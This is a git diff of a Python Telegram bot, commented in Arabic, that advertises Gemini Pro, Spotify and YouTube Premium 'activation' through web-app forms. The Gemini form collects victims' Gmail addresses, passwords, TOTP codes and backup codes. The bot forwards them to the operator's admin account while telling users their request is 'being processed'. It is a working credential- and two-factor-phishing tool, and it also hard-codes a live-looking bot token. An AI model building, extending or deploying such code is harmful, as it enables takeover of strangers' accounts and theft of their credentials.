@@ -2,9 +2,8 @@ import telebot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
 import json
 
-# ضع هنا توكن بوتك الخاص
+# توكن البوت والآيدي الخاص بك
 API_TOKEN = '8840162276:AAEs2AlVqsdRBCaqa5yMLsw_noCb7cv1dn0'
-# ضع هنا الآيدي (ID) الخاص بحسابك لكي تصلك الطلبات عليه
 ADMIN_ID = '8227136699'
 
 bot = telebot.TeleBot(API_TOKEN)
@@ -13,61 +12,63 @@ bot = telebot.TeleBot(API_TOKEN)
 def send_welcome(message):
     markup = InlineKeyboardMarkup(row_width=1)
     
-    # استبدل هذا الرابط برابط موقعك على Netlify الخاص بواجهة الإدخال
-    web_app_url = "https://ضع_رابط_موقعك_هنا.netlify.app"
+    # روابط النماذج الخاصة بك من جيت هوب التي أنشأناها للتو
+    gemini_url = "https://hanynew.github.io/mybot/gemini.html"
+    spotify_url = "https://hanynew.github.io/mybot/spotify.html"
+    youtube_url = "https://hanynew.github.io/mybot/youtube.html"
     
+    # أزرار فتح النماذج المنبثقة
     markup.add(
-        InlineKeyboardButton("🤖 تفعيل جيمناي برو (فتح النموذج)", web_app=WebAppInfo(url=web_app_url)),
-        InlineKeyboardButton("🎧 تحقق سبوتيفاي", callback_data="spotify_page"),
-        InlineKeyboardButton("🌟 تحقق يوتيوب بريميوم", callback_data="youtube_page")
+        InlineKeyboardButton("🤖 تفعيل Gemini Pro", web_app=WebAppInfo(url=gemini_url)),
+        InlineKeyboardButton("🎧 تفعيل Spotify Premium", web_app=WebAppInfo(url=spotify_url)),
+        InlineKeyboardButton("▶️ تفعيل YouTube Premium", web_app=WebAppInfo(url=youtube_url))
     )
     
-    welcome_text = """
-أهلاً بك في متجرنا الرقمي الاحترافي! 🌟
-اختر الخدمة المطلوبة من الأزرار أدناه:
-"""
-    bot.send_message(message.chat.id, welcome_text, reply_markup=markup)
+    bot.send_message(message.chat.id, "أهلاً بك!\nاختر الخدمة المطلوبة من الأزرار أدناه لتقديم طلبك:", reply_markup=markup)
 
-# استقبال البيانات المرسلة من النافذة المنبثقة وتوجيهها لك
+# استقبال البيانات من النماذج
 @bot.message_handler(content_types=['web_app_data'])
 def handle_web_app_data(message):
     chat_id = message.chat.id
-    username = message.from_user.username if message.from_user.username else "بدون معرف"
+    username = f"@{message.from_user.username}" if message.from_user.username else "بدون معرف"
     
     try:
-        # قراءة البيانات الواردة من النافذة المنبثقة
         data = json.loads(message.web_app_data.data)
-        email = data.get('email')
-        password = data.get('password')
-        totp = data.get('totp')
-        backup = data.get('backup')
+        service = data.get('service')
         
-        # 1. الرد على المستخدم بأن طلبه قيد المعالجة تماماً كما طلبت
-        bot.send_message(chat_id, "⏳ **طلبك قيد المعالجة، يرجى الانتظار..**\nتم استلام بياناتك بنجاح وسيتم التفعيل قريباً.")
+        # الرد على العميل واختفاء النافذة كما طلبت تماماً
+        bot.send_message(chat_id, "طلبك قيد المعالجة\nالادارة: bdallhshay7")
         
-        # 2. إرسال البيانات إليك في حسابك الخاص
-        admin_message = f"""
-🤖 **طلب تفعيل Gemini Pro جديد (عبر النافذة المنبثقة)**
-
-👤 العميل: @{username} (ID: `{chat_id}`)
-📧 Gmail: `{email}`
-🔑 الباسورد: `{password}`
-🔒 TOTP: `{totp}`
-🛡️ الرمز الاحتياطي: `{backup}`
+        # تجهيز الرسالة التي ستصلك للإدارة
+        if service == "gemini":
+            admin_msg = f"""
+🤖 **طلب تفعيل Gemini Pro**
+👤 العميل: {username} (ID: `{chat_id}`)
+📧 Gmail: `{data.get('email')}`
+🔑 الباسورد: `{data.get('password')}`
+🔒 TOTP: `{data.get('totp', 'لا يوجد')}`
+🛡️ رموز احتياطية: `{data.get('backup', 'لا يوجد')}`
 """
-        bot.send_message(ADMIN_ID, admin_message, parse_mode="Markdown")
+        elif service == "spotify":
+            admin_msg = f"""
+🎧 **طلب تفعيل Spotify**
+👤 العميل: {username} (ID: `{chat_id}`)
+🔗 رابط الدعوة: `{data.get('link')}`
+"""
+        elif service == "youtube":
+            admin_msg = f"""
+▶️ **طلب تفعيل YouTube**
+👤 العميل: {username} (ID: `{chat_id}`)
+🔗 رابط الدعوة: `{data.get('link')}`
+"""
+        else:
+            admin_msg = "طلب غير معروف!"
+
+        # إرسال البيانات لك على حسابك
+        bot.send_message(ADMIN_ID, admin_msg, parse_mode="Markdown")
         
     except Exception as e:
-        bot.send_message(chat_id, "حدث خطأ في قراءة البيانات، يرجى المحاولة مرة أخرى.")
-
-# دالة للرد على الأزرار الأخرى
-@bot.callback_query_handler(func=lambda call: True)
-def callback_handler(call):
-    if call.data == "spotify_page":
-        bot.answer_callback_query(call.id, "قريباً سيتم توفير نموذج سبوتيفاي")
-    elif call.data == "youtube_page":
-        bot.answer_callback_query(call.id, "قريباً سيتم توفير نموذج يوتيوب")
+        bot.send_message(chat_id, "حدث خطأ، يرجى المحاولة مرة أخرى.")
 
 print("البوت يعمل الآن...")
 bot.infinity_polling()
-
